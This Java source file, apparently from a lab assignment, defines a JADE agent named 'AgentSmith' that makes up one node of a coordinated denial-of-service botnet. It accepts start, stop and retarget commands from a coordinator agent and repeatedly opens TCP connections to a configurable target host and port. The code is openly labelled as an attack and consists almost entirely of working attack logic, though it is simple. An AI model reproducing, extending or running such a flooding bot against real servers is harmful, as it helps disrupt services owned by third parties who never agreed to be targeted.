package lab4;

import java.net.Socket;

import jade.core.Agent;
import jade.core.behaviours.CyclicBehaviour;
import jade.core.behaviours.TickerBehaviour;
import jade.domain.DFService;
import jade.domain.FIPAException;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.lang.acl.ACLMessage;

/**
 * The agent which opens a Socket to the target TCP server.
 * 
 */
public class AgentSmith extends Agent {

	/**
	 * The socket.
	 */
	Socket server = null;

	/**
	 * The host of the target.
	 */
	String TargetHost = "";

	/**
	 * The port of the target.
	 */
	int Port = 0;

	/**
	 * The interval between each request.
	 */
	long TickInterval = 1000;

	/**
	 * Flag if attack is running.
	 */
	boolean doAttack = false;

	/**
	 * The current attack behaviour.
	 */
	SendRequest sr;

	/**
	 * Parses the arguments, registers agent, adds behaviours.
	 */
	protected void setup() {

		Object[] args = getArguments();
		String parent = "";

		if (args != null && args.length > 3) {
			TickInterval = Integer.parseInt((String) args[0]);
			TargetHost = (String) args[1];
			Port = Integer.parseInt((String) args[2]);
			parent = (String) args[3];
			doAttack = Boolean.parseBoolean((String) args[4]);
		}

		/** Registration with the DF */
		DFAgentDescription dfd = new DFAgentDescription();
		ServiceDescription sd = new ServiceDescription();
		sd.setType("Smith");
		sd.setName(getName());
		sd.addOntologies("SmithAgent");
		sd.setOwnership(parent);

		dfd.setName(getAID());
		dfd.addServices(sd);
		try {
			DFService.register(this, dfd);
		} catch (FIPAException e) {
			System.err.println(getLocalName() + " registration with DF unsucceeded. Reason: " + e.getMessage());
			doDelete();
		}

		System.out.println("Agent " + getAID().getLocalName() + " ready. Params: " + TickInterval + TargetHost + Port);

		addBehaviour(new ReceiveMessage());
		if (doAttack) {
			sr = new SendRequest(this, TickInterval);
			addBehaviour(sr);
		}

	}

	/**
	 * The attack behaviour. Sends a request according to the specified
	 * parameters.
	 * 
	 */
	public class SendRequest extends TickerBehaviour {

		long currentTick = 0;

		public SendRequest(Agent a, long period) {
			super(a, period);
			currentTick = period;
			System.out.println(a.getLocalName() + " STARTED attack.");
		}

		protected void onTick() {
			try {
				if (currentTick != TickInterval) {
					reset(TickInterval);
				}
				if (!doAttack) {
					done();
				}
				server = new Socket(TargetHost, Port);

				System.out.println(getLocalName() + ": Connected");

			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	/**
	 * The behaviour to listen for messages and to react accordingly, i.e.
	 * updating the attack parameters.
	 * 
	 */
	public class ReceiveMessage extends CyclicBehaviour {

		public void action() {
			ACLMessage msg = receive();
			if (msg != null) {

				String Message_Content = msg.getContent();

				System.out.println(myAgent.getLocalName() + "received message: " + Message_Content);
				String str = msg.getContent();
				String[] tokens = str.split(";");
				int msgType = Integer.parseInt(tokens[0]);
				try {
					switch (msgType) {
					case CoordinatorAgent.UPDATEPARAMS:
						TickInterval = Long.parseLong(tokens[1]);
						TargetHost = tokens[2];
						Port = Integer.parseInt(tokens[3]);
						break;
					case CoordinatorAgent.STARTATTACK:
						doAttack = true;
						sr = new SendRequest(myAgent, TickInterval);
						addBehaviour(sr);
						break;
					case CoordinatorAgent.STOPATTACK:
						doAttack = false;
						sr.stop();
						System.out.println(myAgent.getLocalName() + " STOPPED attack.");
						break;
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else {
				block();
			}
		}
	}

}
